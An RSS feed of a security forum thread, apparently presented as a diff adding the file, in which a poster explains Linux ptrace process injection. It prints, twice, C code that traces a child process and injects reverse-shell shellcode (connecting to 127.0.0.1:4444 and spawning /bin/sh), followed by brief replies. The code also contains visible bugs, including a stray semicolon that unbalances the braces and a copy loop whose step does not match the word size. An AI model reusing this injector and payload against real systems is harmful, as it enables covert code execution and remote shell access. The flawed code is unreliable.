@@ -1,0 +1,339 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Linux Process Injection</title>
+    <link>https://0x00sec.org/t/linux-process-injection/34862</link>
+    <description>I wrote this originally for my website, but I&#39;ve removed some of the philosophical points I was making on my site. If you&#39;re interested in that, please check out https://16-bitwisdom.com/. 
+
+Ptrace is a system call in the Linux operating system that allows a process to trace another process. This means that a process can be paused, resumed, and examined by another process while it is running. This can be used for a variety of purposes, such as debugging and monitoring, and is particularly useful for security and system administration tasks.
+
+When a process makes a ptrace call, it specifies the process it wants to trace and the type of tracing it wants to perform. The traced process is then put into a stopped state, and the calling process gains control over it. The calling process can then examine and modify the traced process’s memory and registers, as well as receive notifications when certain events occur, such as a system call being made. There are legitimate cases for it’s use such as debuggers, and security software, however as you’ll see an attacker can use it for malicious purposes. 
+
+My original code utilizing ptrace kept causing the program that I was injecting to crash. Even after using GDB I still couldn’t figure out what the issue was. I read recently however that injecting with ptrace can cause a program to crash or not fork properly. I believe this was happening to the original version of my code. That is detailed here, http://phrack.org/issues/59/12.html. After reading through the article I decided to spawn a child process and inject that process. The shell code is just a reverse shell that connects back to the local host , 127.0.0.1, running on port 4444.
+
+I won’t go through the laborious effort of commenting on all the code. However I will comment on some of it. First the payload is defined. I thought of setting it using #define PAYLOAD, but decided against that. Next we create a child process using the fork () system call. I’ve recently experimented with doing this while going through “The Linux Programming Interface Book”. On line 36, we finally get to ptrace, utilizing this we’re able to trace the child process that we previously spawned. We then tell ptrace to getregs, (get registers), this way we can see the RIP (instruction pointer). We inject our payload at the rip. Following this we set the registry with setregs, then we wait for child process. If all of this is successful the injected shell code spawns a child process, which creates a reverse shell, a reverse shell is a shell that allows an attacker to execute commands on a remote host. See the code below.
+
+```
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/types.h&gt;
+
+
+int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len);
+
+
+int main(int argc, char **argv){
+    
+    unsigned char *payload = (unsigned char*)
+
+        &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97&quot;
+        &quot;\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6&quot;
+        &quot;\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce&quot;
+        &quot;\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f&quot;
+        &quot;\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48&quot;
+        &quot;\x89\xe6\x0f\x05&quot;;
+
+    size_t payload_size = strlen((char*)payload);
+    pid_t pid; 
+    int status;
+
+    pid = fork();
+
+    if (pid == -1){
+        perror(&quot;fork&quot;);
+        exit(-1);
+    }else if (pid == 0) {
+        // child process
+        if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)==-1){
+            perror(&quot;ptrace&quot;);
+            exit(-1);
+        }
+        
+        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);
+        exit(0);
+    }else{
+
+        if(waitpid(pid, &amp;status, 0) == -1){
+            perror(&quot;waitpid&quot;);
+            exit(-1);
+        }
+
+        if (!WIFSTOPPED(status)){
+            perror(&quot;Child has not stopped&quot;);
+            exit(-1);
+        }
+
+        struct user_regs_struct regs;
+
+        printf(&quot;Got registers\n&quot;);
+
+        ptrace(PTRACE_GETREGS,pid, NULL, &amp;regs);
+        printf(&quot;RAX: %llx\n&quot;, (unsigned long long) regs.rax);
+        printf(&quot;RBX: %llx\n&quot;, (unsigned long long) regs.rbx);
+        printf(&quot;RCX: %llx\n&quot;, (unsigned long long) regs.rcx);
+        printf(&quot;RDX: %llx\n&quot;, (unsigned long long) regs.rdx);
+        printf(&quot;RDI: %llx\n&quot;, (unsigned long long) regs.rdi);
+        printf(&quot;RSI: %llx\n&quot;, (unsigned long long) regs.rsi);
+        printf(&quot;RIP: %llx\n&quot;, (unsigned long long) regs.rip);
+
+        printf(&quot;[+] Injecting shell code at:%p[+]\n&quot;,(void*)regs.rip);
+        injecting_shell(pid, payload,(void*)regs.rip, payload_size);
+        
+        regs.rip += payload_size;
+        printf(&quot;[+] Setting instruciton pointer %p[+]\n&quot;,(void*)regs.rip);
+
+        if(ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs) ==-1){
+        perror(&quot;ptrace(GETREGS):&quot;);
+        exit(-1);
+        }
+
+        if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1);
+            perror(&quot;ptrace(CONT)&quot;);
+            exit(-1);
+        }
+
+        printf(&quot;[+]Running![+]\n&quot;);
+
+        if ((ptrace(PTRACE_CONT,pid, NULL, NULL)) == -1){
+            perror(&quot;ptrace(CONT):&quot;);
+            exit(-1);
+        }
+
+        if(waitpid(pid, &amp;status, 0) ==-1){
+            perror(&quot;waitpid&quot;);
+            exit(-1);
+        }
+
+        printf(&quot;[+] Done![+]\n&quot;);
+
+    return 0;
+}
+
+int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len){
+    unsigned long long *s = (unsigned long long *) src;
+    unsigned long long *d = (unsigned long long *) dst;
+    for(int i = 0; i &lt; len; i+=4, s++, d++)
+    {
+        if ((ptrace(PTRACE_POKETEXT, pid, d, *s))&lt;0)
+        {
+            perror(&quot;ptrace(PTRACE_POKETEXT):&quot;);
+            exit(-1);
+        }
+    }
+
+    if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1){
+        perror(&quot;ptrace(CONT):&quot;);
+        exit(-1);
+}
+
+    waitpid(pid, NULL, 0);
+
+    return 0;
+}
+```</description>
+    
+    <lastBuildDate>Sat, 26 Aug 2023 07:24:41 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/linux-process-injection/34862.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Linux Process Injection</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/linux-process-injection/34862/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/linux-process-injection/34862/7</link>
+        <pubDate>Fri, 01 Sep 2023 14:08:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-34862-7</guid>
+        <source url="https://0x00sec.org/t/linux-process-injection/34862.rss">Linux Process Injection</source>
+      </item>
+      <item>
+        <title>Linux Process Injection</title>
+        <dc:creator><![CDATA[Sh4d0w]]></dc:creator>
+        <description><![CDATA[
+            <p>That was fun and informative thanks for great and awesome explanation. plz <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> post papers like this in future. Thank you so much.</p>
+          <p><a href="https://0x00sec.org/t/linux-process-injection/34862/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/linux-process-injection/34862/3</link>
+        <pubDate>Tue, 06 Jun 2023 02:59:32 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-34862-3</guid>
+        <source url="https://0x00sec.org/t/linux-process-injection/34862.rss">Linux Process Injection</source>
+      </item>
+      <item>
+        <title>Linux Process Injection</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="Mr_RaG3R" data-post="1" data-topic="34862">
+<div class="title">
+<div class="quote-controls"></div>
+<img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/mr_rag3r/40/8474_2.png" class="avatar"> Mr_RaG3R:</div>
+<blockquote>
+<p>My original code utilizing ptrace kept causing the program that I was injecting to crash.</p>
+</blockquote>
+</aside>
+<p>Not sure what was your problem (be free to post you original code), but maybe the last part of this post could help.</p>
+<aside class="quote quote-modified" data-post="1" data-topic="1097">
+  <div class="title">
+    <div class="quote-controls"></div>
+    <img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/13708_2.png" class="avatar">
+    <a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">[Linux] Infecting Running Processes</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
+  </div>
+  <blockquote>
+    We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processes in memory… In other words, it will introduce you to the basics of how to write your own debugger. 
+Use Cases
+Before going into the gory details, let’s introduce a couple of situations that may benef…
+  </blockquote>
+</aside>
+
+          <p><a href="https://0x00sec.org/t/linux-process-injection/34862/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/linux-process-injection/34862/2</link>
+        <pubDate>Fri, 02 Jun 2023 14:47:52 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-34862-2</guid>
+        <source url="https://0x00sec.org/t/linux-process-injection/34862.rss">Linux Process Injection</source>
+      </item>
+      <item>
+        <title>Linux Process Injection</title>
+        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
+        <description><![CDATA[
+            <p>I wrote this originally for my website, but I’ve removed some of the philosophical points I was making on my site. If you’re interested in that, please check out <a href="https://16-bitwisdom.com/" rel="noopener nofollow ugc">https://16-bitwisdom.com/</a>.</p>
+<p>Ptrace is a system call in the Linux operating system that allows a process to trace another process. This means that a process can be paused, resumed, and examined by another process while it is running. This can be used for a variety of purposes, such as debugging and monitoring, and is particularly useful for security and system administration tasks.</p>
+<p>When a process makes a ptrace call, it specifies the process it wants to trace and the type of tracing it wants to perform. The traced process is then put into a stopped state, and the calling process gains control over it. The calling process can then examine and modify the traced process’s memory and registers, as well as receive notifications when certain events occur, such as a system call being made. There are legitimate cases for it’s use such as debuggers, and security software, however as you’ll see an attacker can use it for malicious purposes.</p>
+<p>My original code utilizing ptrace kept causing the program that I was injecting to crash. Even after using GDB I still couldn’t figure out what the issue was. I read recently however that injecting with ptrace can cause a program to crash or not fork properly. I believe this was happening to the original version of my code. That is detailed here, <a href="http://phrack.org/issues/59/12.html" class="inline-onebox" rel="noopener nofollow ugc">.:: Phrack Magazine ::.</a>. After reading through the article I decided to spawn a child process and inject that process. The shell code is just a reverse shell that connects back to the local host , 127.0.0.1, running on port 4444.</p>
+<p>I won’t go through the laborious effort of commenting on all the code. However I will comment on some of it. First the payload is defined. I thought of setting it using <span class="hashtag">#define</span> PAYLOAD, but decided against that. Next we create a child process using the fork () system call. I’ve recently experimented with doing this while going through “The Linux Programming Interface Book”. On line 36, we finally get to ptrace, utilizing this we’re able to trace the child process that we previously spawned. We then tell ptrace to getregs, (get registers), this way we can see the RIP (instruction pointer). We inject our payload at the rip. Following this we set the registry with setregs, then we wait for child process. If all of this is successful the injected shell code spawns a child process, which creates a reverse shell, a reverse shell is a shell that allows an attacker to execute commands on a remote host. See the code below.</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/types.h&gt;
+
+
+int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len);
+
+
+int main(int argc, char **argv){
+    
+    unsigned char *payload = (unsigned char*)
+
+        "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
+        "\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
+        "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
+        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
+        "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
+        "\x89\xe6\x0f\x05";
+
+    size_t payload_size = strlen((char*)payload);
+    pid_t pid; 
+    int status;
+
+    pid = fork();
+
+    if (pid == -1){
+        perror("fork");
+        exit(-1);
+    }else if (pid == 0) {
+        // child process
+        if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)==-1){
+            perror("ptrace");
+            exit(-1);
+        }
+        
+        execl("/bin/ls", "ls", NULL);
+        exit(0);
+    }else{
+
+        if(waitpid(pid, &amp;status, 0) == -1){
+            perror("waitpid");
+            exit(-1);
+        }
+
+        if (!WIFSTOPPED(status)){
+            perror("Child has not stopped");
+            exit(-1);
+        }
+
+        struct user_regs_struct regs;
+
+        printf("Got registers\n");
+
+        ptrace(PTRACE_GETREGS,pid, NULL, &amp;regs);
+        printf("RAX: %llx\n", (unsigned long long) regs.rax);
+        printf("RBX: %llx\n", (unsigned long long) regs.rbx);
+        printf("RCX: %llx\n", (unsigned long long) regs.rcx);
+        printf("RDX: %llx\n", (unsigned long long) regs.rdx);
+        printf("RDI: %llx\n", (unsigned long long) regs.rdi);
+        printf("RSI: %llx\n", (unsigned long long) regs.rsi);
+        printf("RIP: %llx\n", (unsigned long long) regs.rip);
+
+        printf("[+] Injecting shell code at:%p[+]\n",(void*)regs.rip);
+        injecting_shell(pid, payload,(void*)regs.rip, payload_size);
+        
+        regs.rip += payload_size;
+        printf("[+] Setting instruciton pointer %p[+]\n",(void*)regs.rip);
+
+        if(ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs) ==-1){
+        perror("ptrace(GETREGS):");
+        exit(-1);
+        }
+
+        if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1);
+            perror("ptrace(CONT)");
+            exit(-1);
+        }
+
+        printf("[+]Running![+]\n");
+
+        if ((ptrace(PTRACE_CONT,pid, NULL, NULL)) == -1){
+            perror("ptrace(CONT):");
+            exit(-1);
+        }
+
+        if(waitpid(pid, &amp;status, 0) ==-1){
+            perror("waitpid");
+            exit(-1);
+        }
+
+        printf("[+] Done![+]\n");
+
+    return 0;
+}
+
+int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len){
+    unsigned long long *s = (unsigned long long *) src;
+    unsigned long long *d = (unsigned long long *) dst;
+    for(int i = 0; i &lt; len; i+=4, s++, d++)
+    {
+        if ((ptrace(PTRACE_POKETEXT, pid, d, *s))&lt;0)
+        {
+            perror("ptrace(PTRACE_POKETEXT):");
+            exit(-1);
+        }
+    }
+
+    if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1){
+        perror("ptrace(CONT):");
+        exit(-1);
+}
+
+    waitpid(pid, NULL, 0);
+
+    return 0;
+}
+</code></pre>
+          <p><a href="https://0x00sec.org/t/linux-process-injection/34862/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/linux-process-injection/34862/1</link>
+        <pubDate>Tue, 02 May 2023 22:08:14 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-34862-1</guid>
+        <source url="https://0x00sec.org/t/linux-process-injection/34862.rss">Linux Process Injection</source>
+      </item>
+  </channel>
+</rss>
